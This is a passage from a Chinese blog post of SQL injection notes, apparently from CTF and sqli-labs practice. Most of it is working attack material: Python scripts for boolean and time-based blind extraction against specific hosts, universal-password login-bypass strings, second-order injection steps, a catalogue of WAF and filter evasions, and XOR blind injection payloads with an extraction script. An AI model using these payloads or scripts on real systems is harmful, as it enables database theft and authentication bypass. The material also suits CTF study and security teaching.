class="line">         flag=flag+str</span><br><span class="line">         <span class="keyword">print</span> <span class="string">"flag:"</span>,flag</span><br><span class="line">         <span class="keyword">break</span></span><br><span class="line">     <span class="keyword">except</span> KeyboardInterrupt,e:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line">     <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"> <span class="comment">#print i+1,str</span></span><br></pre></td></tr></table></figure>



<p>其中有个问题，没过滤 union 、select，但是 union select 就不行，中间加上 %0a、%0b 或者 tab 什么的 </p>
<p>然后就能发现</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username &#x3D; admin&#39; union%0aselect 1,2</span><br><span class="line">password &#x3D; 1</span><br><span class="line">返回值是password error</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username &#x3D; admin&#39; union%0aselect 1,2</span><br><span class="line">password &#x3D; 2</span><br><span class="line">没有回显</span><br></pre></td></tr></table></figure>

<p>1</p>
<p>2</p>
<p>3</p>
<p>4</p>
<p>5</p>
<p>6</p>
<p>7</p>
<p>然后就可以注入了！</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">'http://114.67.224.31:32769'</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_slowly</span><span class="params">(inject)</span>:</span></span><br><span class="line">    flag=<span class="string">''</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">        key=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">            temp_inject = <span class="string">"' union  select 1,ascii(substring(("</span>+str(inject)+<span class="string">"),"</span>+str(i)+<span class="string">",1))="</span>+str(j)+<span class="string">"#"</span></span><br><span class="line">            data = &#123;<span class="string">"username"</span>:temp_inject,<span class="string">"password"</span>:<span class="number">1</span>&#125;</span><br><span class="line">            content = requests.post(url=url,data=data).content</span><br><span class="line">            <span class="keyword">if</span> <span class="string">"error"</span> <span class="keyword">not</span> <span class="keyword">in</span> content:</span><br><span class="line">                key=<span class="number">1</span></span><br><span class="line">                flag+=chr(j)</span><br><span class="line">                <span class="keyword">print</span> flag</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> key==<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">'__main__'</span>:</span><br><span class="line">    inject = <span class="string">"select flag from flag"</span>    //你看 这个传参就很有灵性</span><br><span class="line">    get_slowly(inject)</span><br><span class="line"><span class="comment">#9620cf959a51bdce3ae8ff2849cd8f5b</span></span><br><span class="line">————————————————</span><br><span class="line">版权声明：本文为CSDN博主「Assassin__is__me」的原创文章，遵循 CC <span class="number">4.0</span> BY-SA 版权协议，转载请附上原文出处链接及本声明。</span><br><span class="line">原文链接：https://blog.csdn.net/qq_35078631/article/details/<span class="number">78587457</span></span><br></pre></td></tr></table></figure>

<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">猜解数据库名长度</span><br><span class="line">?id=1'and if(length(database())=8,1,sleep(5))<span class="comment">--+   看一下数据库名长度  如果正确页面有回显 =7就回显为空白   </span></span><br><span class="line">猜解数据库名的值 </span><br><span class="line">?id=1'and if(left(database(),1)='a',1,sleep(5))<span class="comment">--+数据库名第一位是否为a</span></span><br><span class="line">?id=1'and if(left(database(),1)='s',1,sleep(5))<span class="comment">--+数据库名第一位是否为s</span></span><br><span class="line">?id=1'and if(ascii(substr((<span class="keyword">select</span> <span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),&#123;&#125;,<span class="number">1</span>))&gt;&#123;&#125;,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'and if(ascii(substr(database(),1,1))=115,1,sleep(5))--+</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),&#123;&#125;,<span class="number">1</span>))&gt;&#123;&#125;,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></span><br><span class="line"><span class="keyword">or</span>  <span class="keyword">ASCII</span> 二分法 </span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span>’ <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">97</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>)) <span class="comment"># </span></span><br><span class="line">一个个找，然后就能够猜出完整的库名 dvwa</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">'and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;80,1,sleep(5))--+  爆表名，第一位ascii作比较</span></span><br><span class="line"><span class="string">?id=1'</span> <span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> <span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>()),<span class="number">1</span>,<span class="number">1</span>))&gt;<span class="number">80</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></span><br><span class="line">?<span class="keyword">id</span>=<span class="number">1</span><span class="string">' and if(ascii(substr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,sleep(1))--+</span></span><br><span class="line"><span class="string">?id=1'</span><span class="keyword">and</span> <span class="keyword">if</span>(<span class="keyword">ascii</span>(<span class="keyword">substr</span>((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),&#123;&#125;,<span class="number">1</span>))&gt;&#123;&#125;,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">时间盲注脚本</span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url = <span class="string">"http://127.0.0.1/sqli-labs-master/Less-5/?id="</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> low &lt; high:</span><br><span class="line">        mid = (low+high)//<span class="number">2</span></span><br><span class="line">        payload1 = <span class="string">"1'and if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,sleep(1))--+"</span>.format(i,mid)<span class="comment">#security</span></span><br><span class="line">        payload2 = <span class="string">"1' and if(ascii(subtr((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;,1,sleep(1))--+"</span>.format(i,mid)<span class="comment">#emails,referers,uagents,users</span></span><br><span class="line">        <span class="comment">#payload5 = "1'and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;,1))&gt;&#123;&#125;,1,sleep(1))--+".format(i, mid) #只能跑出单个emails</span></span><br><span class="line">        payload3 = <span class="string">"1' and if(ascii(substr((select group_concat(column_name) from information_schema.columns where table_name='users'),&#123;&#125;,1))&gt;&#123;&#125;,1,sleep(1))--+"</span>.format(i,mid)</span><br><span class="line">        <span class="comment"># emails:id,email_id ,referers:id,referer,ip_address,uagents:id,uagent,ip_address,username ,users:id,username,password,username,passwd,sex,age,email,phone,id</span></span><br><span class="line">        payload4 = <span class="string">"1' and if(ascii(substr((select group_concat(username) from security.users),&#123;&#125;,1))&gt;&#123;&#125;,1,sleep(1))--+"</span>.format(i,mid)</span><br><span class="line">        r = requests.get(url=url+payload4)</span><br><span class="line">        <span class="comment"># print(payload1)</span></span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">'You are in'</span> <span class="keyword">in</span> r.text:    <span class="comment">#语句正确与否两个回显是不一样的   You are in</span></span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid</span><br><span class="line">    <span class="comment"># print(low,mid,high)</span></span><br><span class="line">    flag += chr(low)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep(n) 延时n秒</span><br><span class="line">benchmark(1000000,md5(1))</span><br></pre></td></tr></table></figure>

<h4 id="绕过："><a href="#绕过：" class="headerlink" title="绕过："></a><strong>绕过：</strong></h4><ul>
<li><code>if(bool,sleep(5),0) =&gt; case when (bool) then sleep(5) else 0 end</code></li>
<li><code>sleep((bool)\*5) EG: sleep((substr(user(),1,1)=&#39;r&#39;)\*5) 思维发散：利用bool各种加减乘除操作</code></li>
</ul>
<h4 id="1-判断是否存在注入，"><a href="#1-判断是否存在注入，" class="headerlink" title="1. 判断是否存在注入，"></a>1. <em>判断是否存在注入</em>，</h4><p>输入 1’ and sleep (5) #，感觉到明显延迟；</p>
<p>输入 1 and sleep (5) #，没有延迟；</p>
<p>说明存在字符型的基于时间的盲注。</p>
<h4 id="2-猜解当前数据库名"><a href="#2-猜解当前数据库名" class="headerlink" title="2. 猜解当前数据库名"></a>2. 猜解当前数据库名</h4><p>首先猜解数据名的长度：</p>
<p>1’ and if (length (database ())=1,sleep (5),1) # 没有延迟</p>
<p>1’ and if (length (database ())=2,sleep (5),1) # 没有延迟</p>
<p>1’ and if (length (database ())=3,sleep (5),1) # 没有延迟</p>
<p>1’ and if (length (database ())=4,sleep (5),1) # 明显延迟</p>
<p>说明数据库名长度为 4 个字符。</p>
<p>接着采用二分法猜解数据库名：</p>
<p>1’ and if (ascii (substr (database (),1,1))&gt;97,sleep (5),1)# 明显延迟</p>
<p>…</p>
<p>1’ and if (ascii (substr (database (),1,1))&lt;100,sleep (5),1)# 没有延迟</p>
<p>1’ and if (ascii (substr (database (),1,1))&gt;100,sleep (5),1)# 没有延迟</p>
<p>说明数据库名的第一个字符为小写字母 d。</p>
<p>…</p>
<p>重复上述步骤，即可猜解出数据库名。</p>
<h4 id="3-猜解数据库中的表名"><a href="#3-猜解数据库中的表名" class="headerlink" title="3. 猜解数据库中的表名"></a>3. 猜解数据库中的表名</h4><p>首先猜解数据库中表的数量：</p>
<p>1’ and if ((select count (table_name) from information_schema.tables where table_schema=database () )=1,sleep (5),1)# 没有延迟</p>
<p>1’ and if ((select count (table_name) from information_schema.tables where table_schema=database () )=2,sleep (5),1)# 明显延迟</p>
<p>说明数据库中有两个表。</p>
<p>接着挨个猜解表名：</p>
<p>1’ and if (length (substr ((select table_name from information_schema.tables where table_schema=database () limit 0,1),1))=1,sleep (5),1) # 没有延迟</p>
<p>…</p>
<p>1’ and if (length (substr ((select table_name from information_schema.tables where table_schema=database () limit 0,1),1))=9,sleep (5),1) # 明显延迟</p>
<p>说明第一个表名的长度为 9 个字符。</p>
<p>采用二分法即可猜解出表名。</p>
<h4 id="4-猜解表中的字段名"><a href="#4-猜解表中的字段名" class="headerlink" title="4. 猜解表中的字段名"></a>4. 猜解表中的字段名</h4><p>首先猜解表中字段的数量：</p>
<p>1’ and if ((select count (column_name) from information_schema.columns where table_name= ’users’)=1,sleep (5),1)# 没有延迟</p>
<p>…</p>
<p>1’ and if ((select count (column_name) from information_schema.columns where table_name= ’users’)=8,sleep (5),1)# 明显延迟</p>
<p>说明 users 表中有 8 个字段。</p>
<p>接着挨个猜解字段名：</p>
<p>1’ and if (length (substr ((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep (5),1) # 没有延迟</p>
<p>…</p>
<p>1’ and if (length (substr ((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep (5),1) # 明显延迟</p>
<p>说明 users 表的第一个字段长度为 7 个字符。</p>
<p>采用二分法即可猜解出各个字段名。</p>
<h4 id="5-猜解数据"><a href="#5-猜解数据" class="headerlink" title="5. 猜解数据"></a>5. 猜解数据</h4><p>同样采用二分法。</p>
<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Less-24</span><br><span class="line">注册admin&#39;# 123456</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/C:%5CUsers%5C60120%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200717185407999.png" alt="image-20200717185407999"></p>
<p>修改密码</p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/C:%5CUsers%5C60120%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200717185506805.png" alt="image-20200717185506805"></p>
<blockquote>
<p>原理：在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes  或者是借助get_magic_quotes_gpc  对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据。比如在第一次插入数据的时候，数据中带有单引号，直接插入到了数据库中；然后在下一次使用中在【拼凑】的过程中，就形成了二次注入。</p>
</blockquote>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200724162700969.png" alt="image-20200724162700969"></p>
<p><strong>实例：</strong> 强网杯 three hit ：<a href="http://www.freebuf.com/articles/web/167089.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/167089.html</a></p>
<p><strong>可以把二次注入的payload用十六进制编码写入数据库来绕过过滤</strong></p>
<h2 id="fuzz-看waf"><a href="#fuzz-看waf" class="headerlink" title="fuzz  看waf"></a>fuzz  看waf</h2><p> 先fuzz单字符来看看waf。还是拦截了很多的，而且逗号和空格也被过滤了。 </p>
<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/20190606135816-14265b86-8820-1.jpeg.png" alt="20190606135816-14265b86-8820-1.jpeg"></p>
<h2 id="SQL万能密码"><a href="#SQL万能密码" class="headerlink" title="SQL万能密码"></a>SQL万能密码</h2><p>1’ or 1=1 #</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select * from user where username&#x3D;&#39;&#39; and pass&#x3D;&#39;&#39;</span><br><span class="line"># 构造 username&#x3D;devnull&#39; or &#39;1后，sql 语句变成</span><br><span class="line">select * from user where username&#x3D;&#39;devnull&#39; or &#39;1&#39; and pass&#x3D;&#39;&#39;</span><br></pre></td></tr></table></figure>

<p>没有对单引号进行过滤 ‘or’=’or’</p>
<p>‘||1||’</p>
<p>admin’||’1</p>
<ol>
<li><p>“or”a”=”a </p>
</li>
<li><p>‘.).or.(‘.a.’=’.a </p>
</li>
<li><p>or 1=1– </p>
</li>
<li><p>‘or 1=1– </p>
</li>
<li><p>a’or’ 1=1– </p>
</li>
<li><p>“or 1=1– </p>
</li>
<li><p>‘or.’a.’=’a </p>
</li>
<li><p>“or”=”a’=’a </p>
</li>
<li><p>‘or”=’ </p>
</li>
<li><p>‘or’=’or’</p>
<blockquote>
<p>‘or 1# 还是说过长<br>‘*1#<br>‘%1#<br>‘=-#<br>有时候#不管用是因为过滤了#号 用%23</p>
</blockquote>
</li>
</ol>
<p>用户名:”or “a”=”a<br>密码:”or “a”=”a</p>
<hr>
<p> 1：”or “a”=”a<br> 2： ‘.).or.(‘.a.’=’.a<br> 3：or 1=1–<br>4：’or 1=1–<br>5：a’or’ 1=1–<br>6：”or 1=1–<br>7：’or.’a.’=’a<br> 8：”or”=”a’=’a<br> 9：’or’’=’<br> 10：’or’=’or’<br>原理都是利用SQL语法来利用注入,其实这也是注入的一种,都是因为提交字符未加过滤或过滤不严而导致的.<br>其实万能是没有的,默认是很多的,</p>
<h2 id="多条数据显示"><a href="#多条数据显示" class="headerlink" title="多条数据显示"></a>多条数据显示</h2><p> concat()<br> group_concat()<br> concat_ws()</p>
<h2 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h2><p> system_user() 系统用户名<br> user() 用户名<br> current_user 当前用户名<br> session_user()连接数据库的用户名<br> database() 数据库名<br> version() MYSQL数据库版本<br> load_file() MYSQL读取本地文件的函数<br> @@datadir 读取数据库路径<br> @@basedir MYSQL 安装路径<br> @@version_compile_os 操作系统 Windows Server 2003</p>
<h2 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h2><p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/image-20200725200836410.png" alt></p>
<blockquote>
<p>绕过空格过滤：<code>+，/**/ select..password、select+user()，双重空格，回车换行符(%0a,%a0)，宽字节(%df)</code>，<strong>圆括号</strong>， <code>%20  %09，%0a,%0b,%0c,%0d</code>等  UNION(SELECT xx) where(id)=(2)and(1)=(1) </p>
<p> %0c = form feed, new page<br> %09 = horizontal tab<br> %0d = carriage return<br> %0a = line feed, new line </p>
<blockquote>
<p> <code>// 使用括号，select, from , where 这些关键字不能用括号select(table_name)from(information_schema.tables)where(table_schema)=database()</code> </p>
</blockquote>
<blockquote>
<p>连续运算绕过使用连续等号<br><code>SELECT * from users where username=&#39;-1&#39;=&#39;&#39; and password=&#39;-1&#39;=&#39;&#39;</code> </p>
<p>从左到右运算，先计算username=’-1’，一般数据库里不会有’-1’，故该值为0。再计算0=’’，得到值为1。password=’-1’=’’同理。</p>
</blockquote>
<blockquote>
<p>绕过union,select等关键字过滤：大小写，双写(uniounionn,unionunion)，内联注释(/<em>!union</em>/) <code>/*！union*/</code>，编码</p>
<p>只要按照union  select from 的顺序出现，就被过滤 </p>
<p><code>/union([\s\S]+)select([\s\S]+)from/i</code> </p>
<p>绕过方法 </p>
<p><code>id=1=2|@c:=(select(1))union(select@c)</code> </p>
<p>读目录的exp为 </p>
<p><code>id=1=2|@c:=(select(flag)from(flag)where(flag&lt;0x30))union(select@c)</code></p>
</blockquote>
<p> 字符串黑名单 ： SELECT ‘a’ ‘d’ ‘mi’ ‘n’; CONCAT(‘a’, ‘d’); CONCAT_WS(‘’, ‘a’); group_concat(‘a’,’b’) </p>
<p>绕过引号过滤： 0x…… 、 hex() 、 unhex() 、 char() 、 %df(宽字节) </p>
<p>绕过and、or过滤：&amp;&amp;，||，%26%26，大小写，双写关键字(anandd,andand)，编码    <strong>异或运算符</strong> </p>
<ul>
<li><strong>使用 ^ : <code>username=admin&#39;^(ascii(mid((passwd)from(1)))&gt;=10)^&#39;1&#39;=&#39;1</code></strong></li>
<li><strong>1^1^1 真</strong> </li>
</ul>
<p>绕过order by ： into @,@,@… group by n </p>
<p> where ： having </p>
<p>绕过 id = 3 过滤： not id &gt; 3 and not id &lt; 4 </p>
<p>绕过 &gt; 10 过滤：  not between 0 and 10 </p>
<p>绕过 if   过滤: case when (bool) then 1 else 0 end </p>
<p>绕过小括号被过滤，使用正则匹配，如regexp binary ‘^.*$’或者使用笛卡儿积，如： </p>
<p>union select b.column_name from information_schema.tables a join information_schema.columns b join information_schema.columns c where 1=2</p>
<p>  绕过逗号过滤，’xor(select case when 2&gt;1 then sleep(4) else 0 end limit 0 offset 1)or’</p>
<ul>
<li><p>SUBSTR(password FROM 3 FOR 1) 等同于SUBSTR(PASSWORD,3,1) </p>
</li>
<li><p>SUBSTR(password FROM 2) 等同于 SUBSTR(PASSWORD,2) </p>
<ul>
<li>substr(database()from(3)for(1)) 等同于 mid(database()from(3)for(1))</li>
</ul>
</li>
</ul>
<ul>
<li>limit 1,1 中的逗号用limit 1 offset 1  </li>
</ul>
<p>碰到 “=” 等于号被过滤的情况。  可以使用 &lt;&gt; 不等于，！  也可以改用 like </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;1&#39; || username like 0x61646d696e)#</span><br><span class="line"># 16进制转换后为，发现admin前后不能加&#39;，否则会找不到数据</span><br><span class="line">&gt;1&#39; || username like admin)#</span><br></pre></td></tr></table></figure>

<p> 1.过滤应对方法</p>
<p>可以利用 16进制进行绕过，抓包更改参数 id为1 union select 1,group_concat(column_name) from information_schema.columns where table_name=0×7573657273 #，查询成功：</p>
<p>2.过滤应对方法<br>只要不用’就行<br>1 or 1=1 #<br>1 order by 3#<br>1 union select 2,3#<br>2  union select version(),user()<br>id=2 union select 1,table_name from information_schema.tables where table_schema=(select database())   #<br>1  union select 1,group_concat(column_name) from information_schema.columns where table_name=(select table_name from information_schema.tables where table_schema=(select database())limit 1 )  #</p>
</blockquote>
<h3 id="技巧-反引号-与-联合的妙用"><a href="#技巧-反引号-与-联合的妙用" class="headerlink" title="技巧 反引号 `与@联合的妙用"></a>技巧 反引号 `与@联合的妙用</h3><blockquote>
<p>反引号用来引住列名、表名和<strong>别名（别名可以省去 as）</strong></p>
<p>@xxx 用来自定义变量（set @a=1;）</p>
<p><strong>@<code>xxx</code> 可以被当做一个自定义变量</strong></p>
<p>order by NULL 表示按默认的方式排序</p>
</blockquote>
<blockquote>
<p>ban掉 了 or或 and与 =连 用 ， 所 以 普 通 的 or 1=(paylaod)形 式 不 好 用 了 ， 这 里 可 以 用 异<br>或 注 入 （ 当 然 其 他 运 算 符 都 可 以 ）</p>
<p> 因 为 对 union过 滤 ， 所 以 不 能 用 联 合 查 询 了 ， or|and|substr|if|hex|mid|char|等 等 都 进 行<br> 了 过 滤 ， 这 里 只 能 用 报 错 注 入 ， updatexml， extractvalue都 可 以</p>
</blockquote>
<h2 id="regexp盲注-过滤了括号"><a href="#regexp盲注-过滤了括号" class="headerlink" title="regexp盲注 过滤了括号()"></a>regexp盲注 过滤了括号()</h2><ul>
<li>在盲注中，如果过滤了括号()，那么将无法使用substr等函数，于是无法正常的逐字节读取字段内容，此时可以使用 </li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">SELECT * FROM users WHERE name NOT REGEXP &#39;^a&#39;</span><br><span class="line">SELECT * FROM users WHERE name NOT REGEXP &#39;^ad&#39;</span><br><span class="line">SELECT * FROM users WHERE name NOT REGEXP &#39;^adm&#39;</span><br><span class="line">SELECT * FROM users WHERE name NOT REGEXP &#39;^admi&#39;</span><br><span class="line">SELECT * FROM users WHERE name NOT REGEXP &#39;^admin&#39;</span><br></pre></td></tr></table></figure>

<p>regexp相当于rlike，使用REGEXP，NOT REGEXP，RLIKE，NOT RLIKE绕过对括号的过滤 </p>
<h2 id="异-或-盲-注"><a href="#异-或-盲-注" class="headerlink" title="异 或 盲 注"></a>异 或 盲 注</h2><h3 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h3><p>题目过滤了<code>空格，+，*，or，substr</code>…等一些字符。而且#号注释也不起作用。 </p>
<p> 于是尝试异或注入。 </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;119.23.73.3:5004&#x2F;?id&#x3D;1&#39;^&#39;1   返回错误</span><br><span class="line">http:&#x2F;&#x2F;119.23.73.3:5004&#x2F;?id&#x3D;1&#39;^&#39;0   返回正常</span><br></pre></td></tr></table></figure>

<p><img src="/2019/11/24/1%20sql%E6%B3%A8%E5%85%A5/20190606135745-0118966c-8820-1.jpeg.png" alt="20190606135745-0118966c-8820-1.jpeg"></p>
<p> 检索数据库： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;2&#39;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),1,1))&#x3D;104))^&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p> 检索表： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;2&#39;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(table_name))FROM(information_schema.tables)WHERE(table_schema&#x3D;&#39;moctf&#39;)),1,1))&#x3D;104))^&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p> 检索字段： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;2&#39;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(column_name))FROM(information_schema.columns)WHERE(table_name&#x3D;&#39;do_y0u_l1ke_long_t4ble_name&#39;)),1,1))&#x3D;104))^&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p> 读Flag： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id&#x3D;2&#39;^!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(d0_you_als0_l1ke_very_long_column_name))FROM(moctf.do_y0u_l1ke_long_t4ble_name)),1,1))&#x3D;104))^&#39;1&#39;&#x3D;&#39;1</span><br></pre></td></tr></table></figure>

<p> 脚本： </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">#文字转ascii ord()</span><br><span class="line">#ascii转文字 ascii()</span><br><span class="line"></span><br><span class="line">dic &#x3D; &quot;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_,&quot;</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;119.23.73.3:5004&#x2F;?id&#x3D;2&#39;^&quot;</span><br><span class="line">keyword &#x3D; &quot;Tip&quot;</span><br><span class="line">string &#x3D; &quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1, 300):</span><br><span class="line">    for j in dic:</span><br><span class="line">        payload &#x3D; &quot;!(SELECT(ASCII(MID((SELECT(GROUP_CONCAT(schema_name))FROM(information_schema.schemata)),&#123;0&#125;,1))&#x3D;&#123;1&#125;))^&#39;1&#39;&#x3D;&#39;1&quot;.format(str(i),ord(j))</span><br><span class="line">        url_get &#x3D; url + payload</span><br><span class="line">        print(url_get)</span><br><span class="line">        content &#x3D; requests.get(url_get)</span><br><span class="line">        if keyword in content.text:</span><br><span class="line">            string +&#x3D; j</span><br><span class="line">            print(string)</span><br><span class="line">            break</span><br><span class="line">print(&quot;result &#x3D; &quot; + string)</span><br></pre></td></tr></table></figure>

















